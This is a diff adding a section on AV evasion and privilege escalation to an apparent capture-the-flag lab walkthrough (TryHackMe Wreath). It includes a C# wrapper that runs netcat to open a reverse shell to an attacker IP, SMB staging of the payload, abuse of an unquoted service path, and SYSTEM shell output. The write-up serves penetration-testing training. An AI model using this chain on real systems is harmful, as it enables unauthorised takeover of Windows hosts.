@@ -3094,3 +3094,206 @@ Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)
 ```
 
 </details>
+
+## 29. AV Evasion - Privilege Escalation
+
+<details>
+  <summary>---</summary>
+
+Recap:
+- We have privilege that could be used to escalate to system permissions. However, we need to obfuscate the exploit to get past Defender
+- We have unquoted service path vulnerability for a service running as the system account - `SystemExplorerHelpService`
+
+Exploits for manipulating privilage will need:
+- Custom compilation
+- Obfuscated
+
+The unquoted service path attack is simpler because:
+- Only need small wrapper program that activates netcat already uplaoded
+- The executable will send a reverse shell as the owner of the service (local system)
+- Ideally written in C# to integrate well with Windows service management system, but this can be done by creating a standalone executable
+- In an enterprise AV, this technique may still be detected and require more sophisticated solution
+
+Installing Visual Studio 
+- On Linux machine use - `mono` dotnet core compiler
+- `sudo apt install mono-devel`
+- Create new file
+
+```cs
+using System;
+using System.Diagnostics;
+
+namespace Wrapper{
+    class Program{
+        static void Main(){
+                Process proc = new Process();
+                ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-Neozer0.exe", "10.50.86.79 49999 -e cmd.exe");
+                procInfo.CreateNoWindow = true;
+                proc.StartInfo = procInfo;
+                proc.Start();
+        }
+    }
+}
+```
+
+- `using System;` and `using System.Diagnostics;` - starts new process
+- `namespace Wrapper{` and `class Program{` - creates namespace and class `Program`
+- `ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");` - Creates new process start info to set params
+- `procInfo.CreateNoWindow = true;` - not create GUI window when starting
+- `proc.StartInfo = procInfo;` and `proc.Start();` - attach `ProcessStartInfo` object to the process and starts it
+
+Now we compile the program with Mono `mcs` compiler
+
+```
+kali@kali:~/thm/wreath$ mcs Wrapper.cs 
+kali@kali:~/thm/wreath$ ls Wrapper*
+Wrapper.cs  Wrapper.exe
+kali@kali:~/thm/wreath$ file Wrapper.exe 
+Wrapper.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+```
+
+Upload the file either using python web server or Impacket SMB server
+
+Impacket
+- `git clone https://github.com/SecureAuthCorp/impacket`
+- `sudo pip3 install -r requirements.txt `
+
+Start smb server on our IP serving a share called `share` in current directory. This is also using SMBv2 for relatively up to date targets
+```
+kali@kali:~/thm/wreath$ sudo python3 ~/code/impacket/examples/smbserver.py share . -smb2support -username user -password hellotheretaco
+Impacket v0.9.23.dev1+20210422.174300.cb6d43a6 - Copyright 2020 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+In the reverse shell we run
+- `net use \\10.50.86.79\share /USER:user hellotheretaco`
+
+```
+C:\xampp\htdocs\resources\uploads>net use \\10.50.86.79\share /USER:user hellotheretaco
+net use \\10.50.86.79\share /USER:user hellotheretaco
+The command completed successfully.
+
+
+C:\xampp\htdocs\resources\uploads>copy \\10.50.86.79\share\Wrapper.exe %TEMP%\wrapper-Neozer0.exe
+copy \\10.50.86.79\share\Wrapper.exe %TEMP%\wrapper-Neozer0.exe
+        1 file(s) copied.
+```
+
+Share can be stopped with `net use \\ATTACKER_IP\share /del`
+
+We now start another listener and execute
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+```
+
+```
+C:\xampp\htdocs\resources\uploads>"%TEMP%\wrapper-Neozer0.exe"
+"%TEMP%\wrapper-Neozer0.exe"
+```
+
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50512
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>
+```
+
+Copy over file to `Program.exe`
+
+`copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"`
+
+```
+C:\xampp\htdocs\resources\uploads>copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"
+copy %TEMP%\wrapper-Neozer0.exe "C:\Program Files (x86)\System Explorer\System.exe"
+        1 file(s) copied.
+
+C:\xampp\htdocs\resources\uploads>dir "C:\Program Files (x86)\System Explorer\"
+dir "C:\Program Files (x86)\System Explorer\"
+ Volume in drive C has no label.
+ Volume Serial Number is A041-2802
+
+ Directory of C:\Program Files (x86)\System Explorer
+
+25/04/2021  08:58    <DIR>          .
+25/04/2021  08:58    <DIR>          ..
+22/12/2020  00:55    <DIR>          System Explorer
+25/04/2021  08:00             3,584 System.exe
+               1 File(s)          3,584 bytes
+               3 Dir(s)   6,967,848,960 bytes free
+```
+
+Restart service
+
+Stop - `sc stop SystemExplorerHelpService`
+
+Start - `sc start SystemExplorerHelpService`
+
+```
+C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
+sc stop SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 3  STOP_PENDING 
+                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x1388
+
+C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
+sc start SystemExplorerHelpService
+[SC] StartService FAILED 1053:
+
+The service did not respond to the start or control request in a timely fashion.
+```
+
+And we check on our listener with `root`
+``` 
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50544
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+We also need to clean up
+- `del "C:\Program Files (x86)\System Explorer\System.exe"`
+- `sc start SystemExplorerHelpService`
+
+```
+C:\Windows\system32>del "C:\Program Files (x86)\System Explorer\System.exe"
+del "C:\Program Files (x86)\System Explorer\System.exe"
+
+C:\Windows\system32>sc start SystemExplorerHelpService
+sc start SystemExplorerHelpService
+
+SERVICE_NAME: SystemExplorerHelpService 
+        TYPE               : 20  WIN32_SHARE_PROCESS  
+        STATE              : 2  START_PENDING 
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3332
+        FLAGS              : 
+
+C:\Windows\system32>
+```
+
+</details>
